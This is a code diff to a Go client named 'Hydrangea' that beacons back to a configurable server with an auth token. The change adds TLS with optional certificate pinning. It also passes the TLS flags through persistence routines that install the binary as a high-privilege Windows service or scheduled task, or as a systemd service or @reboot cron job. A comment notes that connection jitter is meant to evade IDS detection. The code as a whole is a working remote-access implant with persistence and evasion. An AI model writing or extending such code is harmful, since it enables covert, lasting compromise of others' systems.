@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"context"
 	"crypto/sha256"
+	"crypto/tls"
 	"encoding/binary"
 	"encoding/json"
 	"errors"
@@ -26,11 +27,13 @@ import (
 
 var (
 	// Injected via -ldflags -X (see serverctl build-client)
-	DefaultServerHost = "127.0.0.1"
-	DefaultServerPort = "9000"
-	DefaultAuthToken  = "supersecret"
-	DefaultClientID   = "default-hydrangea-beacon"
-	DefaultRootBase   = "."
+	DefaultServerHost     = "127.0.0.1"
+	DefaultServerPort     = "9000"
+	DefaultAuthToken      = "supersecret"
+	DefaultClientID       = "default-hydrangea-beacon"
+	DefaultRootBase       = "."
+	DefaultTLSEnabled     = "false"
+	DefaultTLSFingerprint = ""
 )
 
 type Header map[string]any
@@ -103,6 +106,41 @@ func readFrame(conn net.Conn) (Header, []byte, error) {
 		}
 	}
 	return hdr, payload, nil
+}
+
+// dialConn opens a plain or TLS connection to addr.
+//
+// TLS behaviour:
+//   - tlsEnabled=false  → plain TCP (default)
+//   - tlsEnabled=true, tlsFingerprint=""  → TLS, cert NOT verified
+//     (self-signed / --no-verify-tls behaviour)
+//   - tlsEnabled=true, tlsFingerprint set → TLS, leaf-cert SHA-256 is pinned;
+//     connection is aborted on mismatch (colons in the fingerprint are stripped
+//     so both "aa:bb:…" and "aabb…" forms are accepted)
+func dialConn(addr string, tlsEnabled bool, tlsFingerprint string) (net.Conn, error) {
+	if !tlsEnabled {
+		return net.Dial("tcp", addr)
+	}
+	cfg := &tls.Config{InsecureSkipVerify: true} // cert verified by fingerprint below
+	tlsConn, err := tls.Dial("tcp", addr, cfg)
+	if err != nil {
+		return nil, err
+	}
+	if tlsFingerprint != "" {
+		certs := tlsConn.ConnectionState().PeerCertificates
+		if len(certs) == 0 {
+			tlsConn.Close()
+			return nil, fmt.Errorf("TLS: server sent no certificates")
+		}
+		sum := sha256.Sum256(certs[0].Raw)
+		got := fmt.Sprintf("%x", sum[:])
+		want := strings.ToLower(strings.ReplaceAll(tlsFingerprint, ":", ""))
+		if got != want {
+			tlsConn.Close()
+			return nil, fmt.Errorf("TLS fingerprint mismatch\n  got:  %s\n  want: %s", got, want)
+		}
+	}
+	return tlsConn, nil
 }
 
 // ---------- helpers ----------
@@ -676,7 +714,7 @@ func printLinuxDeviceInfo() {
 
 // -- Windows
 
-func schedule_task_windows(ip string, port int, token, clientID, root string) error {
+func schedule_task_windows(ip string, port int, token, clientID, root, extraFlags string) error {
 	// get the current executable path
 	exePath, err := os.Executable()
 	if err != nil {
@@ -687,6 +725,9 @@ func schedule_task_windows(ip string, port int, token, clientID, root string) er
 	taskName := "Hydrangea"
 	// Create command with environment variable arguments that will be populated at runtime
 	args := fmt.Sprintf("--server %s --port %d --auth-token %s --client-id %s --root \"%s\"", ip, port, token, clientID, root)
+	if extraFlags != "" {
+		args += " " + extraFlags
+	}
 	cmd := exec.Command("schtasks", "/Create", "/SC", "ONSTART", "/TN", taskName, "/TR",
 		fmt.Sprintf("\"%s\" %s", exePath, args), "/RL", "HIGHEST", "/F")
 	
@@ -702,7 +743,7 @@ func schedule_task_windows(ip string, port int, token, clientID, root string) er
 	return nil
 }
 
-func schedule_task_windows_svc(ip string, port int, token, clientID, root string) error {
+func schedule_task_windows_svc(ip string, port int, token, clientID, root, extraFlags string) error {
 	// get the current executable path
 	exePath, err := os.Executable()
 
@@ -713,6 +754,9 @@ func schedule_task_windows_svc(ip string, port int, token, clientID, root string
 	// create a Windows service using sc.exe
 	serviceName := "Hydrangea"
 	args := fmt.Sprintf("--server %s --port %d --auth-token %s --client-id %s --root \"%s\"", ip, port, token, clientID, root)
+	if extraFlags != "" {
+		args += " " + extraFlags
+	}
 	cmd := exec.Command("sc", "create", serviceName, "binPath=", fmt.Sprintf("\"%s %s\"", exePath, args), "start=", "auto")
 	var outBuf, errBuf bytes.Buffer
 	cmd.Stdout = &outBuf
@@ -740,7 +784,7 @@ func schedule_task_windows_svc(ip string, port int, token, clientID, root string
 
 // -- Linux
 
-func schedule_task_unix(ip string, port int, token, clientID, root string) error {
+func schedule_task_unix(ip string, port int, token, clientID, root, extraFlags string) error {
 	// get the current executable path
 	exePath, err := os.Executable()
 	if err != nil {
@@ -748,8 +792,11 @@ func schedule_task_unix(ip string, port int, token, clientID, root string) error
 	}
 
 	// create a cron job that runs at reboot
-	cronEntry := fmt.Sprintf("@reboot \"%s\" --server %s --port %d --auth-token %s --client-id %s --root \"%s\"\n",
-		exePath, ip, port, token, clientID, root)
+	cronArgs := fmt.Sprintf("--server %s --port %d --auth-token %s --client-id %s --root \"%s\"", ip, port, token, clientID, root)
+	if extraFlags != "" {
+		cronArgs += " " + extraFlags
+	}
+	cronEntry := fmt.Sprintf("@reboot \"%s\" %s\n", exePath, cronArgs)
 
 	// write the cron job to the crontab
 	cmd := exec.Command("bash", "-c", fmt.Sprintf("echo \"%s\" | crontab -", cronEntry))
@@ -766,24 +813,28 @@ func schedule_task_unix(ip string, port int, token, clientID, root string) error
 	return nil
 }
 
-func schedule_task_unix_svc(ip string, port int, token, clientID, root string) error {
+func schedule_task_unix_svc(ip string, port int, token, clientID, root, extraFlags string) error {
 	// get the current executable path
 	exePath, err := os.Executable()
 	if err != nil {
 		return fmt.Errorf("failed to get executable path: %v", err)
 	}
 
+	svcArgs := fmt.Sprintf("--server %s --port %d --auth-token %s --client-id %s --root %s", ip, port, token, clientID, root)
+	if extraFlags != "" {
+		svcArgs += " " + extraFlags
+	}
 	// create a systemd service file
 	serviceContent := fmt.Sprintf(`[Unit]
 	Description=Hydrangea Service
 	After=network.target
 	[Service]
 	Type=simple
-	ExecStart=%s --server %s --port %d --auth-token %s --client-id %s --root %s
+	ExecStart=%s %s
 	Restart=on-failure
 	[Install]
 	WantedBy=multi-user.target
-	`, exePath, ip, port, token, clientID, root)
+	`, exePath, svcArgs)
 
 	servicePath := "/etc/systemd/system/hydrangea.service"
 	if err := os.WriteFile(servicePath, []byte(serviceContent), 0o644); err != nil {
@@ -806,21 +857,21 @@ func schedule_task_unix_svc(ip string, port int, token, clientID, root string) e
 
 // -- common
 
-func schedule_persistence(ip string, port int, token, clientID, root string) {
+func schedule_persistence(ip string, port int, token, clientID, root, extraFlags string) {
 	var err error
 	if runtime.GOOS == "windows" {
 		// Try to create a service first
-		err = schedule_task_windows_svc(ip, port, token, clientID, root)
+		err = schedule_task_windows_svc(ip, port, token, clientID, root, extraFlags)
 		if err != nil {
 			// Fallback to scheduled task if service creation fails
-			err = schedule_task_windows(ip, port, token, clientID, root)
+			err = schedule_task_windows(ip, port, token, clientID, root, extraFlags)
 		}
 	} else {
 		// Try to create a systemd service first
-		err = schedule_task_unix_svc(ip, port, token, clientID, root)
+		err = schedule_task_unix_svc(ip, port, token, clientID, root, extraFlags)
 		if err != nil {
 			// Fallback to cron job if service creation fails
-			err = schedule_task_unix(ip, port, token, clientID, root)
+			err = schedule_task_unix(ip, port, token, clientID, root, extraFlags)
 		}
 	}
 	if err != nil {
@@ -853,6 +904,9 @@ func main() {
 	token := flag.String("auth-token", DefaultAuthToken, "Auth token")
 	clientID := flag.String("client-id", DefaultClientID, "Client ID (default: hostname)")
 	root := flag.String("root", DefaultRootBase, "Base directory for relative paths")
+	defaultTLSEnabled, _ := strconv.ParseBool(DefaultTLSEnabled)
+	tlsEnabled := flag.Bool("tls", defaultTLSEnabled, "Connect to server using TLS")
+	tlsFingerprint := flag.String("tls-fingerprint", DefaultTLSFingerprint, "Expected SHA-256 fingerprint of server TLS cert (hex, colons optional); implies --tls")
 	testConnection := flag.Bool("test-connection", false, "Test connection to server and exit")
 	persist := flag.Bool("persist", false, "Schedule persistence on the system (requires appropriate permissions)")
 	debug := flag.Bool("debug", false, "Print debug info and exit")
@@ -866,6 +920,11 @@ func main() {
 	if *deviceInfo {
 		printDeviceInfo()
 		os.Exit(0)
+	}
+
+	// A fingerprint alone implies TLS.
+	if *tlsFingerprint != "" {
+		*tlsEnabled = true
 	}
 
 	id := *clientID
@@ -883,7 +942,7 @@ func main() {
 	if *testConnection {
 		id = fmt.Sprintf("test-connection-%d", time.Now().UnixNano()%100000)
 		fmt.Printf("Testing connection to %s with client ID '%s'...\n", addr, id)
-		conn, err := net.Dial("tcp", addr)
+		conn, err := dialConn(addr, *tlsEnabled, *tlsFingerprint)
 		if err != nil {
 			fmt.Printf("Connection failed: %v\n", err)
 			os.Exit(1)
@@ -901,13 +960,20 @@ func main() {
 	}
 
 	if *persist {
-		schedule_persistence(*server, *port, *token, id, *root)
+		var extraFlags string
+		if *tlsEnabled {
+			extraFlags = "--tls"
+			if *tlsFingerprint != "" {
+				extraFlags += fmt.Sprintf(" --tls-fingerprint %s", *tlsFingerprint)
+			}
+		}
+		schedule_persistence(*server, *port, *token, id, *root, extraFlags)
 		os.Exit(0)
 	}
 
 	// Normal connection loop
 	for {
-		if err := runOnce(addr, id, *token, *root); err != nil {
+		if err := runOnce(addr, id, *token, *root, *tlsEnabled, *tlsFingerprint); err != nil {
 			// Jitter prevents a fixed beaconing pattern detectable by IDS
 			jitter := time.Duration(rand.Intn(3000)) * time.Millisecond
 			time.Sleep(2*time.Second + jitter)
@@ -918,8 +984,8 @@ func main() {
 	}
 }
 
-func runOnce(addr, clientID, token, root string) error {
-	conn, err := net.Dial("tcp", addr)
+func runOnce(addr, clientID, token, root string, tlsEnabled bool, tlsFingerprint string) error {
+	conn, err := dialConn(addr, tlsEnabled, tlsFingerprint)
 	if err != nil {
 		return err
 	}
